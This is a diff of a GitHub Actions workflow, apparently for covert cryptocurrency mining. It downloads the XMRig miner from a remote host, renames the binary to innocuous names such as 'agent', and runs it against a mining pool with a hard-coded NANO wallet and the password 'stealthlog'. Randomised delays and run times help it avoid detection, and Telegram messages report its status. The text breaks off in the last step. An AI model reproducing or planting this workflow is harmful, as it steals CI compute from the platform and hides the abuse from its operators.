@@ -1,68 +1,61 @@
 name: NANO Collector Loop
 
 on:
-  schedule:
-    - cron: '0 0,12 * * *'  # Jam 07:00 & 19:00 WIB
   workflow_dispatch:
 
 permissions:
   contents: read
 
 jobs:
-  nano:
+  nano_collector:
     runs-on: ubuntu-latest
     timeout-minutes: 360
 
     steps:
-      - name: Update & Install Tools
-        run: |
-          sudo apt update -y && sudo apt install -y curl tar
+      - name: Initialize
+        run: echo "🛰️ Inisialisasi NANO collector..."
 
-      - name: Download Miner
-        run: |
-          curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-          tar -xzf xmrig.tar.gz
-          cd xmrig-6.24.0
-          chmod +x xmrig
-          mv xmrig ../miner
-          cd ..
-          mkdir -p logs
+      - name: Install Dependencies
+        run: sudo apt update -y && sudo apt install -y curl tar
 
-      - name: Run Stealth Mining Loop
+      - name: Notify Start
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          echo "🟢 *NANO Collector aktif.*" | xargs -0 curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
+          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+            -d chat_id="$TG_CHAT_ID" \
+            --data-urlencode text="🟢 *NANO Collector aktif.*\nDurasi kerja acak 20–90 menit." \
+            -d parse_mode=Markdown
 
-          START=$(date +%s)
-          MAX_DURATION=$((6 * 60 * 60))
+      - name: Start Mining
+        run: |
+          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf agent.tar.gz
+          mv xmrig-6.24.0 data-core
+          cd data-core
+          mv xmrig agent
+          chmod +x agent
 
-          while true; do
-            NOW=$(date +%s)
-            ELAPSED=$((NOW - START))
-            [ "$ELAPSED" -ge "$MAX_DURATION" ] && break
+          DELAY=$((RANDOM % 300 + 30))
+          echo "Tunda $DELAY detik..."
+          sleep $DELAY
 
-            SESSION=$((RANDOM % 1800 + 900))
-            COOLDOWN=$((RANDOM % 900 + 300))
+          ./agent -o xmrig.nanswap.com:3333 -a rx -k \
+            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
+            -p stealthlog --randomx-no-rdmsr | tee log.txt &
 
-            ./miner -a rx -o xmrig.nanswap.com:3333 -k \
-              -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
-              -p stealthlog --randomx-no-rdmsr | tee logs/session.log &
-            PID=$!
+          PID=$!
+          WORKTIME=$((RANDOM % 5400 + 1200))
+          echo "Aktif $WORKTIME detik..."
+          sleep $WORKTIME
+          kill $PID
 
-            sleep $SESSION
-            kill $PID
-            sleep 5
-
-            HASHRATE=$(grep -a "speed" logs/session.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1)" H/s"}')
-            ACCEPTED=$(grep -a "accepted" logs/session.log | wc -l)
-            REJECTED=$(grep -a "rejected" logs/session.log | wc -l)
-
-            MSG="✅ *NANO Collector selesai (1 sesi).*%0A%0A📊 *Stats:*%0A• Hashrate: \`$HASHRATE\`%0A• Accepted: \`$ACCEPTED\`%0A• Rejected: \`$REJECTED\`"
-            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-              -d chat_id=$TG_CHAT_ID -d text="$MSG" -d parse_mode=Markdown
-
-            echo "Cooldown selama $COOLDOWN detik..."
-            sleep $COOLDOWN
-          done
+      - name: Extract Logs and Report
+        if: always()
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+        run: |
+          set +e
+          cd $(find . -type d
